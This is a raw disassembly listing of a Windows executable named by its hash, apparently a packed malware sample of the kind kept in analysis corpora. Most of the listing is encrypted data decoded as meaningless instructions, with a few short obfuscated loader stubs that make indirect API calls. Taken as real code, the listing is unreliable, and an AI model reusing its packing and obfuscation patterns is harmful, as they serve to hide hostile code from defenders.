
8ea1520adff771f607dacfe609e9c23313ebe6d158d8aa135b4a8ecb6c908c38.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a775
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0x918a0cf7
  40101f:	lds    eax,FWORD PTR [eax+edi*2]
  401022:	js     0x40109c
  401024:	js     0x401024
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(0)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080a33
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz int 0xa6
  4010d1:	push   es
  4010d2:	lea    ebx,[eax-0x5f]
  4010d5:	(bad)  [ebx]
  4010d7:	pop    esp
  4010d8:	aad    0xe1
  4010da:	inc    ebx
  4010db:	data16 jno 0x4010f0
  4010de:	sbb    cl,BYTE PTR [ebp+eiz*8+0x3a]
  4010e2:	dec    ebx
  4010e3:	xchg   edx,eax
  4010e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4010e5:	mov    dl,0x86
  4010e7:	xor    dl,BYTE PTR [edx+0x34]
  4010ea:	mov    ds:0x7996bd93,eax
  4010ef:	sub    DWORD PTR [ecx+0x71f5d7b8],eax
  4010f5:	ins    DWORD PTR es:[edi],dx
  4010f6:	jns    0x4010e7
  4010f8:	jmp    0x15f6e4f8
  4010fd:	in     al,dx
  4010fe:	jmp    0x4010ff
  401100:	loop   0x4010c8
  401102:	ret    0xd3cc
  401105:	cmp    eax,0x2ac5d9e5
  40110a:	lock add eax,0x8da2c0e6
  401110:	or     edx,DWORD PTR [ebx+ebx*2-0x4b]
  401114:	xor    esp,DWORD PTR [esp+esi*2]
  401117:	push   edi
  401118:	xchg   ebp,eax
  401119:	xlat   BYTE PTR ds:[ebx]
  40111a:	popf   
  40111b:	mov    es,WORD PTR [eax*4+0x5e7c022a]
  401122:	fist   DWORD PTR [edi]
  401124:	mov    ebp,0xdd680cac
  401129:	(bad)  
  40112b:	(bad)  ds:0x51e32a3f
  401131:	inc    edi
  401132:	xor    DWORD PTR [edi+0x7c8c1367],esp
  401138:	scas   al,BYTE PTR es:[edi]
  401139:	inc    eax
  40113a:	out    0x29,eax
  40113c:	fmul   st,st(4)
  40113e:	(bad)  
  40113f:	repz into 
  401141:	out    0xee,eax
  401143:	aaa    
  401144:	inc    ebx
  401145:	xor    eax,0x9204f5a9
  40114a:	mov    ebx,0x50e6d26
  40114f:	pop    ebx
  401150:	icebp  
  401151:	ins    DWORD PTR es:[edi],dx
  401152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401153:	mov    bh,0x7e
  401155:	shr    BYTE PTR ss:[ebx],1
  401158:	test   DWORD PTR [edx+0x221e2444],ebx
  40115e:	les    esi,FWORD PTR [edi]
  401160:	cmp    ebx,DWORD PTR [eax-0x6df7f611]
  401166:	xor    BYTE PTR [eax],bl
  401168:	enter  0xa86,0x54
  40116c:	leave  
  40116d:	fimul  DWORD PTR ds:0x10f82ef9
  401173:	out    dx,eax
  401174:	xor    eax,0x2b0040e0
  401179:	or     al,0xaa
  40117b:	jae    0x40113c
  40117d:	sbb    al,BYTE PTR [eax]
  40117f:	mov    al,ds:0xe61158ce
  401184:	push   ss
  401185:	lods   al,BYTE PTR ds:[esi]
  401186:	lahf   
  401187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401188:	mov    al,ds:0xdc4888f6
  40118d:	pop    ds
  40118e:	xor    al,BYTE PTR [eax-0x7c]
  401191:	add    BYTE PTR ds:0x43b2ce3e,ah
  401197:	mov    ebp,0x617766ab
  40119c:	push   ss
  40119d:	inc    edi
  40119e:	cmp    esp,DWORD PTR [edx]
  4011a0:	sbb    ebp,DWORD PTR [esi]
  4011a2:	mov    BYTE PTR [esi-0x37],al
  4011a5:	(bad)  
  4011a6:	mov    ebp,0x6e8c5894
  4011ab:	mov    dh,ah
  4011ad:	cmp    dl,BYTE PTR ss:[ecx-0x385f08db]
  4011b4:	xchg   ecx,eax
  4011b5:	jb     0x4011b1
  4011b7:	cmp    bh,BYTE PTR [esi]
  4011b9:	in     eax,0x54
  4011bb:	rcr    esp,0x14
  4011be:	mov    eax,0x64ab9656
  4011c3:	cwde   
  4011c4:	cmp    al,0x7a
  4011c6:	fwait
  4011c7:	test   ecx,eax
  4011c9:	dec    esi
  4011ca:	(bad)  
  4011cb:	sti    
  4011cc:	pop    ss
  4011cd:	mov    ss,WORD PTR [ebp+0xfc25b81]
  4011d3:	dec    esi
  4011d4:	or     edx,DWORD PTR [edx]
  4011d6:	push   0x28
  4011d8:	add    eax,0x98e95e19
  4011dd:	in     eax,dx
  4011de:	mov    eax,0xc2cedfaf
  4011e3:	mov    al,ch
  4011e5:	repnz mov DWORD PTR [ebp+0x1ead25a7],0x5aac3adb
  4011f0:	std    
  4011f1:	pop    edi
  4011f2:	inc    eax
  4011f3:	outs   dx,DWORD PTR ds:[esi]
  4011f4:	jb     0x40119b
  4011f6:	loop   0x401202
  4011f8:	mov    cl,BYTE PTR [esi-0x4a]
  4011fb:	inc    ebp
  4011fc:	sub    esi,DWORD PTR [esi-0x4367409e]
  401202:	rol    eax,1
  401204:	iret   
  401205:	sti    
  401206:	push   ebx
  401207:	dec    ebx
  401208:	pop    esp
  401209:	pop    esp
  40120a:	arpl   WORD PTR [edx+0x6b],bx
  40120d:	pop    ds
  40120e:	fsubr  QWORD PTR [eax+0x1efd943e]
  401214:	arpl   WORD PTR [edx-0x53],cx
  401217:	fidivr DWORD PTR [ebx+0x733060df]
  40121d:	test   al,ah
  40121f:	not    DWORD PTR [ebx+ebx*1]
  401222:	in     al,0xb7
  401224:	les    esp,FWORD PTR [ecx-0xb]
  401227:	xchg   BYTE PTR [eax+0x48b88469],dl
  40122d:	sbb    BYTE PTR [edi-0x7bfa2de3],dl
  401233:	sti    
  401234:	adc    eax,0x39afb6df
  401239:	cwde   
  40123a:	arpl   WORD PTR [edx-0x3cc41f7f],si
  401240:	pop    edx
  401241:	icebp  
  401242:	sbb    DWORD PTR [edx+0x32],0x31
  401246:	push   eax
  401247:	cs cdq 
  401249:	leave  
  40124a:	mov    esp,0xe2a3e7cd
  40124f:	mov    eax,ds:0x2d3bf4f6
  401254:	mov    bl,0x79
  401256:	push   edx
  401257:	mov    dh,0x10
  401259:	mov    eax,ds:0xf51418d3
  40125e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40125f:	push   eax
  401260:	mov    WORD PTR [ecx+0x5a],?
  401263:	adc    al,0x86
  401265:	push   ebx
  401266:	outs   dx,BYTE PTR ds:[esi]
  401267:	jnp    0x40123e
  401269:	mov    ebx,0x5bbe6786
  40126e:	cmp    esp,edx
  401270:	lock mov BYTE PTR [edi],bl
  401273:	pop    eax
  401274:	jmp    0x401283
  401276:	mov    WORD PTR [esi-0x5a],ds
  401279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40127a:	test   BYTE PTR [eax],dh
  40127c:	not    DWORD PTR [ebp+0x619ec149]
  401282:	dec    esp
  401283:	aam    0x2a
  401285:	jmp    0x4012a8
  401287:	aaa    
  401288:	push   ecx
  401289:	push   es
  40128a:	pop    esi
  40128b:	push   edx
  40128c:	(bad)  
  40128d:	and    cl,dh
  40128f:	push   0x4c2f0793
  401294:	in     al,dx
  401295:	sahf   
  401296:	imul   esp,DWORD PTR [esi],0x58
  401299:	jns    0x401267
  40129b:	sub    DWORD PTR [esi-0x688d1ab4],ebx
  4012a1:	jg     0x401293
  4012a3:	scas   eax,DWORD PTR es:[edi]
  4012a4:	or     bl,al
  4012a6:	pop    es
  4012a7:	test   al,0xa8
  4012a9:	not    DWORD PTR [ecx+eiz*4]
  4012ac:	out    0xea,al
  4012ae:	inc    ecx
  4012af:	add    BYTE PTR [ecx],dh
  4012b1:	adc    eax,0x42a80d
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7c1
  4012c2:	or     DWORD PTR ds:0x42a76d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a75d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7c1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7b5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a839,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a839
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a839,ebx
  401312:	cmp    DWORD PTR ds:0x42a839,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a839,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a781,0x42a805
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a809,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a809
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a809,edi
  401361:	cmp    DWORD PTR ds:0x42a809,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a809,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a809,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a809
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a809,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7b5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a76d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a76d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a76d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7b5
  4013d7:	push   0x0
  4013d9:	push   0x42a9cd
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a76d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a76d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a76d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a76d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a76d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx-0x65],1
  401422:	xchg   esp,eax
  401423:	repnz mov cl,0xfe
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x401448
  40142e:	sbb    cl,BYTE PTR [ebx]
  401430:	cs loop 0x40140c
  401433:	cmc    
  401434:	inc    esp
  401435:	stc    
  401436:	adc    ecx,DWORD PTR [ebp+0x54da34d5]
  40143c:	xor    al,0xb8
  40143e:	jg     0x4014ac
  401440:	vshufpd xmm1,xmm3,XMMWORD PTR [esi-0x3ba2070e],0xa6
  401449:	dec    eax
  40144a:	lock pop edi
  40144c:	pop    edi
  40144d:	jp     0x401432
  40144f:	push   esp
  401450:	cmp    ecx,ebp
  401452:	(bad)  
  401453:	out    dx,al
  401454:	fcmovu st,st(7)
  401456:	das    
  401457:	je     0x401418
  401459:	jge    0x4014c8
  40145b:	adc    ebp,esi
  40145d:	adc    DWORD PTR [ecx+0x61],esp
  401460:	xchg   ebx,eax
  401461:	test   eax,0xd1387f76
  401466:	lahf   
  401467:	sbb    al,0xb2
  401469:	loopne 0x4014aa
  40146b:	mov    cs,WORD PTR [edi+0x420d07ae]
  401471:	cld    
  401472:	rcpps  xmm3,XMMWORD PTR [ebx-0x64]
  401476:	mov    ds:0xdfda08bc,al
  40147b:	into   
  40147c:	or     dh,BYTE PTR [ebx+edx*2-0x40]
  401480:	jb     0x4014de
  401482:	jbe    0x401415
  401484:	jl     0x401488
  401486:	jp     0x4014b7
  401488:	cmp    DWORD PTR [edx-0x1e2cccba],edi
  40148e:	push   esi
  40148f:	pop    ebx
  401490:	add    eax,DWORD PTR [ecx+eax*8-0x7ca9f6e0]
  401497:	(bad)  
  401498:	jno    0x401503
  40149a:	(bad)  
  40149b:	daa    
  40149c:	out    dx,al
  40149d:	aad    0xe1
  40149f:	add    ah,BYTE PTR [eax-0x3b704750]
  4014a5:	pop    edi
  4014a6:	add    bh,ah
  4014a8:	outs   dx,BYTE PTR ds:[esi]
  4014a9:	(bad)  
  4014aa:	dec    ebp
  4014ab:	std    
  4014ac:	sub    al,0x8f
  4014ae:	or     eax,0xa57f632
  4014b3:	cli    
  4014b4:	fcom   QWORD PTR [edi-0x60cd15d3]
  4014ba:	std    
  4014bb:	into   
  4014bc:	mov    esi,0x587ed1fb
  4014c1:	(bad)  
  4014c2:	lahf   
  4014c3:	stc    
  4014c4:	jns    0x401517
  4014c6:	ret    0x9b58
  4014c9:	rcr    eax,1
  4014cb:	push   esi
  4014cc:	aam    0x86
  4014ce:	bound  edi,QWORD PTR [edi]
  4014d0:	dec    ebp
  4014d1:	jbe    0x4014fb
  4014d3:	fcomip st,st(3)
  4014d5:	in     al,dx
  4014d6:	dec    ecx
  4014d7:	leave  
  4014d8:	mov    esi,0x5b3130be
  4014dd:	(bad)
  4014e0:	scas   al,BYTE PTR es:[edi]
  4014e1:	jmp    0x40152e
  4014e3:	ficom  DWORD PTR [edi+0x2c]
  4014e6:	inc    esi
  4014e7:	loop   0x40149d
  4014e9:	or     al,0xa3
  4014eb:	scas   al,BYTE PTR es:[edi]
  4014ec:	(bad)  
  4014ed:	hlt    
  4014ee:	paddsw mm2,mm0
  4014f1:	mov    ch,0x1f
  4014f3:	mov    edi,0x25de2e08
  4014f8:	ins    DWORD PTR es:[edi],dx
  4014f9:	adc    BYTE PTR [eax+0x7bb4715],cl
  4014ff:	cmp    al,0x4f
  401501:	mov    ds:0xf4ee0cc2,al
  401506:	add    esi,DWORD PTR [eax]
  401508:	fwait
  401509:	jg     0x4014fa
  40150b:	addr16 stc 
  40150d:	xor    al,0xcf
  40150f:	ror    eax,0x34
  401512:	pop    edi
  401513:	jns    0x401578
  401515:	add    DWORD PTR [edi-0x25],ebp
  401518:	ja     0x40154b
  40151a:	cdq    
  40151b:	ins    DWORD PTR es:[edi],dx
  40151c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40151d:	sbb    BYTE PTR [edi-0x505a74fa],dl
  401523:	mov    edx,0x824b04d7
  401528:	dec    ecx
  401529:	inc    ecx
  40152a:	ins    BYTE PTR es:[edi],dx
  40152b:	pop    eax
  40152c:	fmul   QWORD PTR [ebp-0xf]
  40152f:	fisubr WORD PTR [ecx]
  401531:	mov    edx,0xa87c2eca
  401536:	cmp    DWORD PTR [esi+0x78],0xffffff9d
  40153a:	stc    
  40153b:	test   BYTE PTR [ebx*2+0x40d73b72],dl
  401542:	add    DWORD PTR [esp+ebp*2-0x13283b1c],eax
  401549:	adc    eax,0x3d8ae55b
  40154e:	jne    0x401593
  401550:	shl    BYTE PTR [ebx+esi*2],1
  401553:	stc    
  401554:	clc    
  401555:	adc    ebp,DWORD PTR [esi+0x60]
  401558:	dec    eax
  401559:	repz cmp ebp,DWORD PTR [esi]
  40155c:	int    0x38
  40155e:	push   0x16c6760e
  401563:	lods   al,BYTE PTR ds:[esi]
  401564:	(bad)  
  401565:	sub    ch,cl
  401567:	and    eax,0x7b9197e2
  40156c:	push   0x90bb1157
  401571:	mov    DWORD PTR [ebx],edi
  401573:	jnp    0x4014f8
  401575:	pop    ebp
  401576:	jo     0x4015ba
  401578:	fnsave [ebp+esi*8+0x35d022f6]
  40157f:	push   ebp
  401580:	push   DWORD PTR [ecx-0xf801af3]
  401586:	mov    al,0xd5
  401588:	mov    WORD PTR [eax],es
  40158a:	mov    al,ds:0xbf0b4ce4
  40158f:	js     0x40154c
  401591:	dec    edi
  401592:	jno    0x401595
  401594:	push   ds
  401595:	sub    ebx,DWORD PTR [edi]
  401597:	mov    DWORD PTR [esi+ebp*8+0x3cc4dc3b],esi
  40159e:	mov    bh,0xc4
  4015a0:	imul   esp,DWORD PTR [edi],0x75e7a41c
  4015a6:	sahf   
  4015a7:	pop    esi
  4015a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015a9:	in     eax,0x97
  4015ab:	out    dx,al
  4015ac:	dec    esi
  4015ad:	in     al,0x3c
  4015af:	sub    cl,0xf6
  4015b2:	in     al,0x37
  4015b4:	or     ebx,ebx
  4015b6:	xchg   BYTE PTR [ebx-0x5d],al
  4015b9:	dec    edi
  4015ba:	out    dx,eax
  4015bb:	aaa    
  4015bc:	cmp    esi,DWORD PTR [ecx+0x54]
  4015bf:	sub    dl,BYTE PTR [eax+0x34]
  4015c2:	pop    ss
  4015c3:	cli    
  4015c4:	div    BYTE PTR [esi-0x2e]
  4015c7:	icebp  
  4015c8:	or     al,0xe
  4015ca:	jmp    0x1cfb:0x7ed80c48
  4015d1:	sbb    al,0xbd
  4015d3:	repz cmp al,0x6c
  4015d6:	sbb    BYTE PTR [edi],ch
  4015d8:	js     0x4015fb
  4015da:	neg    BYTE PTR [edi+esi*8-0x7ebbc246]
  4015e1:	adc    DWORD PTR [edx],edi
  4015e3:	scas   al,BYTE PTR es:[edi]
  4015e4:	mov    DWORD PTR [esi],edi
  4015e6:	ins    DWORD PTR es:[edi],dx
  4015e7:	cwde   
  4015e8:	jge    0x401643
  4015ea:	jo     0x40159c
  4015ec:	enter  0xa938,0x6d
  4015f0:	push   cs
  4015f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015f2:	jge    0x4015f4
  4015f4:	lahf   
  4015f5:	sub    DWORD PTR [eax+0x2c426189],ecx
  4015fb:	retf   0xd28a
  4015fe:	rcl    BYTE PTR [eax+0x7a7d6832],0xeb
  401605:	dec    eax
  401606:	popa   
  401607:	push   edi
  401608:	stos   DWORD PTR es:[edi],eax
  401609:	loopne 0x4015db
  40160b:	shl    BYTE PTR [ebx-0x45c12467],1
  401611:	adc    BYTE PTR [edi+0x49078b49],cl
  401617:	addr16 push ecx
  401619:	fist   DWORD PTR ds:0xf63b893a
  40161f:	shl    BYTE PTR [eax],1
  401621:	and    cl,bl
  401623:	dec    ebp
  401624:	out    dx,al
  401625:	and    dh,BYTE PTR [edi]
  401627:	(bad)  
  401628:	cld    
  401629:	stos   BYTE PTR es:[edi],al
  40162a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40162b:	mov    dl,0x2e
  40162d:	ins    BYTE PTR es:[edi],dx
  40162e:	loope  0x4016a8
  401630:	test   DWORD PTR [edx+0x6b],0x17d6f4fe
  401637:	shl    DWORD PTR [ebx+0xe],1
  40163a:	fwait
  40163b:	outs   dx,DWORD PTR ds:[esi]
  40163c:	cmp    BYTE PTR [edi],bl
  40163e:	push   eax
  40163f:	sbb    DWORD PTR ds:0x99ae4903,0x39
  401646:	cmp    eax,0x2f4d4650
  40164b:	ret    
  40164c:	mov    cs,WORD PTR [edx+0x7f]
  40164f:	in     al,0x8b
  401651:	je     0x4016ae
  401653:	test   BYTE PTR [edx],al
  401655:	pop    ds
  401656:	jo     0x401687
  401658:	ins    DWORD PTR es:[edi],dx
  401659:	push   esp
  40165a:	jp     0x4016c1
  40165c:	sub    al,0x85
  40165e:	xchg   esi,eax
  40165f:	jb     0x401664
  401661:	test   eax,0x48be0026
  401666:	mov    edi,0x9ba21fbd
  40166b:	jo     0x4016d0
  40166d:	pop    ebp
  40166e:	add    eax,0xa9ecc047
  401673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401674:	cmp    BYTE PTR [edx+0x1e],bl
  401677:	cwde   
  401678:	cld    
  401679:	sub    BYTE PTR [ebx-0x6b95c35a],0x5d
  401680:	into   
  401681:	cld    
  401682:	cmp    al,0xf4
  401684:	dec    esi
  401685:	xor    ch,bl
  401687:	aas    
  401688:	into   
  401689:	(bad)  
  40168a:	fbstp  TBYTE PTR [eax+0x3d976b79]
  401690:	int3   
  401691:	(bad)  [ebp+0x55]
  401694:	push   ebp
  401695:	adc    DWORD PTR [ebx*4+0x1020cdbf],ebx
  40169c:	aaa    
  40169d:	and    eax,0xcb761237
  4016a2:	mov    eax,ds:0x5d53b98d
  4016a7:	jae    0x401712
  4016a9:	push   es
  4016aa:	imul   esp,DWORD PTR [edi+0x30fc312],0x4d3581c7
  4016b4:	test   al,0x42
  4016b6:	add    ah,bl
  4016b8:	push   ebx
  4016b9:	add    BYTE PTR [eax],al
  4016bb:	mov    DWORD PTR [ecx],eax
  4016bd:	adc    DWORD PTR ds:0x42a7b9,edi
  4016c3:	lea    eax,[ebp-0x4]
  4016c6:	or     DWORD PTR ds:0x42a769,0x42a75d
  4016d0:	mov    DWORD PTR [ebp-0x10],eax
  4016d3:	xor    DWORD PTR ds:0x42a76d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz in al,0x23
  4016f6:	fistp  DWORD PTR [ebx+0x7c]
  4016f9:	add    edi,DWORD PTR [eax+0x78]
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x4016f7
  401701:	or     edx,DWORD PTR [ecx-0x22]
  401704:	cli    
  401705:	scas   eax,DWORD PTR es:[edi]
  401706:	push   0x3c
  401708:	nop
  401709:	test   al,0x51
  40170b:	jo     0x401720
  40170d:	xchg   ebx,eax
  40170e:	or     esp,esi
  401710:	or     ah,al
  401712:	xchg   ecx,eax
  401713:	or     al,0x24
  401715:	add    al,BYTE PTR [ebp-0x30]
  401718:	dec    esp
  401719:	stos   DWORD PTR es:[edi],eax
  40171a:	aam    0xd5
  40171c:	in     al,dx
  40171d:	sbb    al,0xd4
  40171f:	into   
  401720:	jne    0x4016fd
  401722:	mov    edx,0x79ba0500
  401727:	dec    ebx
  401728:	mov    dl,0x36
  40172a:	inc    esp
  40172b:	(bad)  
  40172c:	jecxz  0x401711
  40172e:	and    al,bh
  401730:	aad    0x4a
  401732:	into   
  401733:	mov    ah,0xa8
  401735:	int    0xfd
  401737:	iret   
  401738:	std    
  401739:	inc    edx
  40173a:	and    dl,BYTE PTR [ebp+0x378eae54]
  401740:	ins    DWORD PTR es:[edi],dx
  401741:	mov    edi,0xe8bbe559
  401746:	popa   
  401747:	in     al,dx
  401748:	mov    esi,0x775f1810
  40174d:	out    0x6a,al
  40174f:	enter  0xe0ad,0x90
  401753:	retf   0x5f58
  401756:	lock mov BYTE PTR [edi+0x345d6095],ah
  40175d:	add    DWORD PTR [esi+0xc93593a],edi
  401763:	test   al,0x9
  401765:	pushf  
  401766:	adc    BYTE PTR [edi+0x715db045],0x96
  40176d:	adc    eax,0x9441275f
  401772:	in     al,0xf2
  401774:	sub    esi,edi
  401776:	inc    esp
  401777:	jp     0x40171c
  401779:	rcl    BYTE PTR [ebx+ebp*4-0x40866d87],1
  401780:	jo     0x4017de
  401782:	fldenv [edx]
  401784:	and    BYTE PTR [ecx+0x77e61b9d],dl
  40178a:	das    
  40178b:	call   0x1199:0xf2b68cdd
  401792:	(bad)  
  401793:	and    bl,bl
  401795:	pop    ecx
  401796:	mov    eax,ds:0xdc6978f7
  40179b:	out    0x14,al
  40179d:	jecxz  0x401750
  40179f:	and    ebp,edi
  4017a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017a3:	ds and ch,bl
  4017a6:	push   eax
  4017a7:	in     al,dx
  4017a8:	icebp  
  4017a9:	popa   
  4017aa:	dec    eax
  4017ab:	push   esi
  4017ac:	js     0x4017aa
  4017ae:	test   al,0x7f
  4017b0:	jbe    0x4017f9
  4017b2:	and    eax,0x9af3d801
  4017b7:	adc    bh,ah
  4017b9:	pop    esi
  4017ba:	lods   al,BYTE PTR ds:[esi]
  4017bb:	jo     0x4017d9
  4017bd:	fisubr DWORD PTR [ebx-0x79]
  4017c0:	push   ebx
  4017c1:	xor    ah,bh
  4017c3:	xor    dh,BYTE PTR [ebp-0x17e8c0ee]
  4017c9:	xchg   esp,eax
  4017ca:	ret    0x53df
  4017cd:	jno    0x401787
  4017cf:	out    dx,al
  4017d0:	xor    bh,BYTE PTR [eax+0x21]
  4017d3:	call   FWORD PTR [ecx-0x71a454c1]
  4017d9:	es ds adc al,dh
  4017dd:	mov    ebp,0x102a44f
  4017e2:	clc    
  4017e3:	sbb    al,bl
  4017e5:	ins    DWORD PTR es:[edi],dx
  4017e6:	leave  
  4017e7:	pop    edx
  4017e8:	js     0x401774
  4017ea:	rcl    DWORD PTR [esi-0x69],1
  4017ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017ee:	ja     0x4017e8
  4017f0:	and    esi,DWORD PTR [ebp-0x40e562bd]
  4017f6:	adc    eax,0xec09e059
  4017fb:	inc    ebp
  4017fc:	fnstenv [edx+0x7e63a083]
  401802:	push   esp
  401803:	mov    bh,0x4f
  401805:	jo     0x40184c
  401807:	aam    0xfc
  401809:	pop    edi
  40180a:	call   0x13d1:0xafe9889e
  401811:	popa   
  401812:	mov    esp,0xb435b1ab
  401817:	lock fwait
  401819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40181a:	sub    eax,0x800caec9
  40181f:	aam    0x28
  401821:	mov    BYTE PTR [esi+0x15fb4ef4],al
  401827:	les    esi,FWORD PTR [ebp+0xb97946]
  40182d:	dec    edi
  40182e:	jg     0x4017fa
  401830:	bound  esi,QWORD PTR [eax]
  401832:	add    eax,0x262eb072
  401837:	xchg   ebp,eax
  401838:	mov    eax,ds:0x58d54173
  40183d:	xchg   BYTE PTR [esi],bh
  40183f:	cmc    
  401840:	scas   al,BYTE PTR es:[edi]
  401841:	lahf   
  401842:	dec    edi
  401843:	fcmove st,st(5)
  401845:	mov    fs,edx
  401847:	lock out dx,al
  401849:	das    
  40184a:	mov    al,ds:0x7405b526
  40184f:	push   ss
  401850:	inc    eax
  401851:	adc    BYTE PTR [esi+ebx*8-0x56],cl
  401855:	repz lds esi,FWORD PTR [esi]
  401858:	mov    WORD PTR [eax-0x6c4d2316],ds
  40185e:	sub    ch,al
  401860:	int3   
  401861:	push   esp
